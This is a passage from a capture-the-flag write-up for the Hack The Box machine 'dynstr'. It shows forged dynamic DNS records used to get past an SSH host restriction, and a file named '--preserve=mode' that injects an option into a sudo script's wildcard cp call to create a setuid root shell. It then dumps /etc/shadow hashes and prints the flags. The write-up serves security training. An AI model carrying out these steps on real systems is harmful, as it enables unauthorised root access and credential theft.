└─$ cat key| sed 's/\\n/\n/g' | > bindmgr
```

### Added a custom DDNS to bypass the SSH restriction

- [https://wiki.debian.org/Bind9](https://wiki.debian.org/Bind9)
- [https://linux.die.net/man/8/nsupdate](https://linux.die.net/man/8/nsupdate)
- [https://www.cloudflare.com/en-gb/learning/dns/dns-records/dns-ptr-record/](https://www.cloudflare.com/en-gb/learning/dns/dns-records/dns-ptr-record/)

Enumerated `bind` info and keys:

```bash
www-data@dynstr:/etc/bind$ ls
bind.keys  db.0  db.127  db.255  db.empty  db.local  ddns.key  infra.key  named.bindmgr  named.conf  named.conf.default-zones  named.conf.local  named.conf.options  rndc.key  zones.rfc1918
www-data@dynstr:/etc/bind$ ls -al
total 68
drwxr-sr-x  3 root bind 4096 Mar 20 12:00 .
drwxr-xr-x 80 root root 4096 Jun  8 19:20 ..
-rw-r--r--  1 root root 1991 Feb 18 04:28 bind.keys
-rw-r--r--  1 root root  237 Dec 17  2019 db.0
-rw-r--r--  1 root root  271 Dec 17  2019 db.127
-rw-r--r--  1 root root  237 Dec 17  2019 db.255
-rw-r--r--  1 root root  353 Dec 17  2019 db.empty
-rw-r--r--  1 root root  270 Dec 17  2019 db.local
-rw-r--r--  1 root bind  100 Mar 15 20:44 ddns.key
-rw-r--r--  1 root bind  101 Mar 15 20:44 infra.key
drwxr-sr-x  2 root bind 4096 Mar 15 20:42 named.bindmgr
-rw-r--r--  1 root bind  463 Dec 17  2019 named.conf
-rw-r--r--  1 root bind  498 Dec 17  2019 named.conf.default-zones
-rw-r--r--  1 root bind  969 Mar 15 20:46 named.conf.local
-rw-r--r--  1 root bind  895 Mar 15 20:46 named.conf.options
-rw-r-----  1 bind bind  100 Mar 15 20:14 rndc.key
-rw-r--r--  1 root root 1317 Dec 17  2019 zones.rfc1918
www-data@dynstr:/etc/bind$ cat named.conf.local | grep -v "//"

include "/etc/bind/infra.key";
zone "dyna.htb" IN { type master; file "dyna.htb.zone"; update-policy { grant infra-key zonesub ANY; }; };
zone "10.in-addr.arpa" IN { type master; file "10.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
zone "168.192.in-addr.arpa" IN { type master; file "168.192.in-addr.arpa.zone"; update-policy { grant infra-key zonesub ANY; }; };
include "/etc/bind/ddns.key";
zone "dnsalias.htb" IN { type master; file "dnsalias.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
zone "dynamicdns.htb" IN { type master; file "dynamicdns.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
zone "no-ip.htb" IN { type master; file "no-ip.htb.zone"; update-policy { grant ddns-key zonesub ANY; }; };
```

Added a custom DDNS:

```bash
www-data@dynstr:/etc$ nsupdate -v -k /etc/bind/infra.key
> update add maoutis.infra.dyna.htb 600 a 10.10.14.5
> send
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
> update add 5.14.10.10.in-addr.arpa 600 ptr maoutis.infra.dyna.htb
> send
```

Logged in using SSH:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/dynstr/loot]
└─$ ssh bindmgr@10.10.10.244 -i bindmgr
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
bindmgr@dynstr:~$ cat user.txt
4eb05cfed2bfab80069912c659e1d7ca
bindmgr@dynstr:~$ hostname && ifconfig
dynstr.dyna.htb
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.244  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:18:5a  txqueuelen 1000  (Ethernet)
        RX packets 1439353  bytes 151749291 (151.7 MB)
        RX errors 0  dropped 156  overruns 0  frame 0
        TX packets 1464952  bytes 329479050 (329.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 133012  bytes 9785288 (9.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 133012  bytes 9785288 (9.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![Pasted image 20210627002039.png](../../zzz_res/attachments/Pasted_image_20210627002039.png)

# Privilege Escalation

## wildcard characters in cp command

Enumerated sudo capabilities:

```bash
bindmgr@dynstr:/etc/bind/named.bindmgr$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

Enumerated **bindmgr.sh**:

```bash
bindmgr@dynstr:/etc/bind/named.bindmgr$ cat /usr/local/bin/bindmgr.sh
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

[how to include wildcard characters in cp command](https://askubuntu.com/questions/1162604/how-to-include-wildcard-characters-in-cp-command)

```bash
bindmgr@dynstr:/tmp/maoutis$ echo 1 > .version
bindmgr@dynstr:/tmp/maoutis$ echo > --preserve=mode
bindmgr@dynstr:/tmp/maoutis$ cp /bin/bash .
bindmgr@dynstr:/tmp/maoutis$ chmod +s bash
bindmgr@dynstr:/tmp/maoutis$ ls -al
total 1176
drwxrwxr-x  2 bindmgr bindmgr    4096 Jun 27 15:59  .
drwxrwxrwt 13 root    root       4096 Jun 27 15:57  ..
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 18  2020  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Jun 27 15:58 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Jun 27 15:57  .version
bindmgr@dynstr:/tmp/maoutis$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/maoutis.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
```

Spawn the high privileged shell:

```bash
bindmgr@dynstr:/etc/bind/named.bindmgr$ ls -al
total 1172
drwxr-sr-x 2 root bind    4096 Jun 27 15:59 .
drwxr-sr-x 3 root bind    4096 Jun 27 15:58 ..
-rwsr-sr-x 1 root bind 1183448 Jun 27 15:59 bash
-rw-rw-r-- 1 root bind       2 Jun 27 15:59 .version
bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash
bash-5.0$ id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
bash-5.0$ exit
exit
bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash -p
bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)
bash-5.0# whoami && wc /root/root.txt && hostname && ifconfig
root
 1  1 33 /root/root.txt
dynstr.dyna.htb
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.244  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:fc:9b  txqueuelen 1000  (Ethernet)
        RX packets 22859  bytes 2186898 (2.1 MB)
        RX errors 0  dropped 37  overruns 0  frame 0
        TX packets 29314  bytes 3194318 (3.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 53530  bytes 3944830 (3.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 53530  bytes 3944830 (3.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-5.0# cat /root/root.txt
da296abbc633589416c004390e92a25b
bash-5.0# cat /etc/shadow | grep '\$'
root:$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1:18705:0:99999:7:::
dyna:$6$hiaXtKAlnSGLdd7X$XdibCf6o9t48IurOmJ0Ip6CsRFWy8pDWTCsFI/DrE2hNbWRSouBZxlAEeoQlfSzLnN39OieXQajwNGDd79Sp./:18705:0:99999:7:::
bindmgr:$6$Y8Q9OmFn9eZFhOVP$QdBBPBiiEGRSIzIE6nAhYIfNeo76Dro0.noSn0Tmvh3j./c3xlcprwtmmeConQ4NtltncDZP3lreBQTwXjFP8/:18772:0:99999:7:::
```

![Pasted image 20210627155812.png](../../zzz_res/attachments/Pasted_image_20210627155812.png)

# Trophy

>[!quote]
>People always make the best exploits. I've never found it hard to hack most people. If you listen to them, watch them, their vulnerabilities are like a neon sign screwed into their heads.
>
\- Elliot Alderson 

>[!success]
>**User.txt**
>4eb05cfed2bfab80069912c659e1d7ca

>[!success]
>**Root.txt**
>da296abbc633589416c004390e92a25b

**/etc/shadow**

```bash
root:$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1:18705:0:99999:7:::
dyna:$6$hiaXtKAlnSGLdd7X$XdibCf6o9t48IurOmJ0Ip6CsRFWy8pDWTCsFI/DrE2hNbWRSouBZxlAEeoQlfSzLnN39OieXQajwNGDd79Sp./:18705:0:99999:7:::
bindmgr:$6$Y8Q9OmFn9eZFhOVP$QdBBPBiiEGRSIzIE6nAhYIfNeo76Dro0.noSn0Tmvh3j./c3xlcprwtmmeConQ4NtltncDZP3lreBQTwXjFP8/:18772:0:99999:7:::
```